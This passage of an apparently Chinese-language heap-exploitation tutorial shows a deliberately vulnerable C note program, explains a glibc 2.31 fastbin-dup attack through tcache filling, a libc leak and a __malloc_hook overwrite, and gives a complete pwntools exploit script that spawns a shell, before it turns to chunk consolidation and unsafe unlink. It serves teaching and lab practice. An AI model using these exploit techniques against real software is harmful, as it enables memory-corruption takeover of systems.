class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Testing in libc-2.31</span></span><br><span class="line"><span class="comment">// gcc fastbin_dup.c -o fastbin_dup</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *g_ptrs[<span class="number">0x20</span>];</span><br><span class="line"><span class="type">int</span> g_size[<span class="number">0x20</span>];</span><br><span class="line"><span class="type">int</span> g_used[<span class="number">0x20</span>];</span><br><span class="line"><span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">read_num</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;=== Note System v1.87 ===&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1) Create Note&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2) Create Note in NEW way&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3) Get Note&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4) Set Note&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5) Delete Note&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;6) Bye&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;# &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (idx &gt;= <span class="number">0x20</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line"></span><br><span class="line">    g_ptrs[idx] = <span class="built_in">malloc</span>(size);</span><br><span class="line">    g_size[idx] = size;</span><br><span class="line">    g_used[idx] = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Create: g_ptrs[%d]\n&quot;</span>, idx);</span><br><span class="line"></span><br><span class="line">    idx++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (idx &gt;= <span class="number">0x20</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line"></span><br><span class="line">    g_ptrs[idx] = <span class="built_in">calloc</span>(<span class="number">1</span>, size);</span><br><span class="line">    g_size[idx] = size;</span><br><span class="line">    g_used[idx] = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Create: g_ptrs[%d]\n&quot;</span>, idx);</span><br><span class="line"></span><br><span class="line">    idx++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;idx:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (g_used[idx]) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;g_ptrs[%d]: %s\n&quot;</span>, idx, g_ptrs[idx]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;idx:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (g_used[idx]) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;str:\n&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, g_ptrs[idx], g_size[idx]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;idx:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (g_ptrs[idx]) &#123;</span><br><span class="line">        <span class="built_in">free</span>(g_ptrs[idx]);</span><br><span class="line">        g_used[idx] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="keyword">switch</span>(read_num()) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            create();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            create2();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            get();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">set</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            delete();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h4><p>可以做這些</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;=== Note System v1.87 ===&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1) Create Note&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2) Create Note in NEW way&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3) Get Note&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4) Set Note&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5) Delete Note&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;6) Bye&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;# &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>這邊可以發現他有兩種create，malloc跟calloc，這裡有個重點，就是calloc拿到的chunk不會是從tcache裡面拿</p>
<p>剩下就是常規操作，可以拿到chunk內容、設定chunk內容、刪掉chunk</p>
<p>現在版本是glibc 2.31，所以說會有tcache key來防double free<br><div class="img-item" data-src="https://hackmd.io/_uploads/HyuoeieOR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HyuoeieOR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>我們可以透過把tcache塞滿，讓chunk進到fastbin來做操作，這樣就可以做fastbin dup</p>
<p>那我們先leak libc，這邊用unsorted bin，先malloc一個大chunk，然後delete在malloc，就可以讀出fd的libc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">DEBUG=<span class="built_in">input</span>(<span class="string">&#x27;open debug?(y/n)&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> DEBUG==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r=process(<span class="string">&#x27;./fastbin_dup&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create1</span>(<span class="params">size</span>):</span><br><span class="line">	r.sendlineafter(<span class="string">b&#x27;#&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create2</span>(<span class="params">size</span>):</span><br><span class="line">	r.sendlineafter(<span class="string">b&#x27;#&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">b&#x27;size&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">index</span>):</span><br><span class="line">	r.sendlineafter(<span class="string">b&#x27;#&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">	r.recvuntil(<span class="string">b&#x27;]: &#x27;</span>)</span><br><span class="line">	rec=r.recvline().strip()</span><br><span class="line">	<span class="comment">#print(rec)</span></span><br><span class="line">	<span class="keyword">return</span> rec</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set</span>(<span class="params">index, chunkstr</span>):</span><br><span class="line">	r.sendlineafter(<span class="string">b&#x27;#&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">	r.sendafter(<span class="string">b&#x27;str&#x27;</span>,chunkstr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	r.sendlineafter(<span class="string">b&#x27;#&#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">b&#x27;idx:&#x27;</span> , <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">	gdb.attach(r)</span><br><span class="line"></span><br><span class="line">create1(<span class="number">0x440</span>) <span class="comment">#idx 0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment">#idx 1~7</span></span><br><span class="line">	create1(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create1(<span class="number">0x440</span>) <span class="comment">#id 8</span></span><br><span class="line"></span><br><span class="line">leak_libc=u64(get(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libc_offset=<span class="number">0x1ecbe0</span></span><br><span class="line">libc_base=leak_libc-libc_offset</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NAUPINFO @ LEAK LIBC: &quot;</span>,<span class="built_in">hex</span>(leak_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NAUPINFO @ LIBC BASE: &quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>再來刪掉7個chunk塞滿tcache bin<br>剩下的就會進到fastbin，來bypass key檢查，接下來就是fastbindup<br>申請兩塊chunk(chunk 1 -&gt; idx 9、chunk 2 -&gt; idx 10)<br>然後<br>delete chunk 1<br>delete chunk 2<br>delete chunk 1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin -&gt; chunk 1 -&gt; chunk 2 -&gt; chunk 1 -&gt; ...</span><br></pre></td></tr></table></figure>

<p>calloc拿到chunk 1(idx 11)<br>寫入malloc_hook</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin -&gt; chunk 2 -&gt; chunk 1 -&gt; malloc hook</span><br></pre></td></tr></table></figure>

<p>寫到這裡偽造chunk(現在的fastbin又變回了指向header)<br><div class="img-item" data-src="https://hackmd.io/_uploads/SkwCwjx_A.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SkwCwjx_A.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/BJFBjolO0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BJFBjolO0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>之後在malloc_hook寫入one gadget，之後呼叫malloc就可以跳到onegadget了</p>
<p>get shell~</p>
<h4 id="script-3"><a href="#script-3" class="headerlink" title="script"></a>script</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DEBUG=<span class="built_in">input</span>(<span class="string">&#x27;open debug?(y/n)&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> DEBUG==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r=process(<span class="string">&#x27;./fastbin_dup&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create1</span>(<span class="params">size</span>):</span><br><span class="line">	r.sendlineafter(<span class="string">b&#x27;#&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create2</span>(<span class="params">size</span>):</span><br><span class="line">	r.sendlineafter(<span class="string">b&#x27;#&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">b&#x27;size&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">index</span>):</span><br><span class="line">	r.sendlineafter(<span class="string">b&#x27;#&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">	r.recvuntil(<span class="string">b&#x27;]: &#x27;</span>)</span><br><span class="line">	rec=r.recvline().strip()</span><br><span class="line">	<span class="comment">#print(rec)</span></span><br><span class="line">	<span class="keyword">return</span> rec</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set</span>(<span class="params">index, chunkstr</span>):</span><br><span class="line">	r.sendlineafter(<span class="string">b&#x27;#&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">	r.sendafter(<span class="string">b&#x27;str&#x27;</span>,chunkstr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	r.sendlineafter(<span class="string">b&#x27;#&#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">b&#x27;idx:&#x27;</span> , <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">	gdb.attach(r)</span><br><span class="line"></span><br><span class="line">create1(<span class="number">0x440</span>) <span class="comment">#idx 0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment">#idx 1~7</span></span><br><span class="line">	create1(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create1(<span class="number">0x440</span>) <span class="comment">#idx 8</span></span><br><span class="line"></span><br><span class="line">leak_libc=u64(get(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libc_offset=<span class="number">0x1ecbe0</span></span><br><span class="line">libc_base=leak_libc-libc_offset</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NAUPINFO @ LEAK LIBC: &quot;</span>,<span class="built_in">hex</span>(leak_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NAUPINFO @ LIBC BASE: &quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">	delete(i)</span><br><span class="line"></span><br><span class="line">create2(<span class="number">0x60</span>) <span class="comment">#idx 9</span></span><br><span class="line">create2(<span class="number">0x60</span>) <span class="comment">#idx 10</span></span><br><span class="line">delete(<span class="number">9</span>) </span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">create2(<span class="number">0x60</span>) <span class="comment">#idx 11</span></span><br><span class="line"></span><br><span class="line">malloc_hook_offset=<span class="number">0x1ecb70</span></span><br><span class="line">libc_malloc_hook=libc_base+malloc_hook_offset</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NAUPINFO @ MALLOC HOOK: &quot;</span>,<span class="built_in">hex</span>(libc_malloc_hook))</span><br><span class="line"></span><br><span class="line">malloc_hook_chunk=libc_malloc_hook-<span class="number">0x33</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NAUPINFO @ MALLOC HOOK CHUNK: &quot;</span>,<span class="built_in">hex</span>(malloc_hook_chunk))</span><br><span class="line"><span class="built_in">set</span>(<span class="number">11</span>,p64(malloc_hook_chunk))</span><br><span class="line"></span><br><span class="line">create2(<span class="number">0x60</span>) <span class="comment">#idx 12</span></span><br><span class="line">create2(<span class="number">0x60</span>) <span class="comment">#idx 13</span></span><br><span class="line"></span><br><span class="line">create2(<span class="number">0x60</span>) <span class="comment">#idx 14</span></span><br><span class="line"></span><br><span class="line">onegadget=<span class="number">0xe3b01</span>+libc_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NAUPINFO @ ONE GADGET: &quot;</span>,<span class="built_in">hex</span>(onegadget))</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>(<span class="number">14</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x23</span>+p64(onegadget))</span><br><span class="line"></span><br><span class="line">create1(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="另外解法"><a href="#另外解法" class="headerlink" title="另外解法"></a>另外解法</h4><p>這邊嘗試用另外一種解法，就是把malloc hook改成system，然後把其中一個位置寫成&#x2F;bin&#x2F;sh傳入(另外還要leak libc、leak heap)</p>
<h2 id="consolidate"><a href="#consolidate" class="headerlink" title="consolidate"></a>consolidate</h2><p>共有三種合併方式</p>
<ul>
<li>forward consolidate</li>
<li>backward consolidate</li>
<li>malloc consolidate</li>
</ul>
<p>若要將兩塊free chunk合併可以採用，調整一塊大小，並把另外一塊從鍊表中移掉</p>
<p>(backward consolidate)<br><div class="img-item" data-src="https://hackmd.io/_uploads/ByNjYOivC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/ByNjYOivC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>接下來可以看到下面的unsafe unlink，來看攻擊手法</p>
<h3 id="source-code-Glibc-2-31"><a href="#source-code-Glibc-2-31" class="headerlink" title="source code(Glibc 2.31)"></a>source code(Glibc 2.31)</h3><p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L4326">https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L4326</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L1451">https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L1451</a></p>
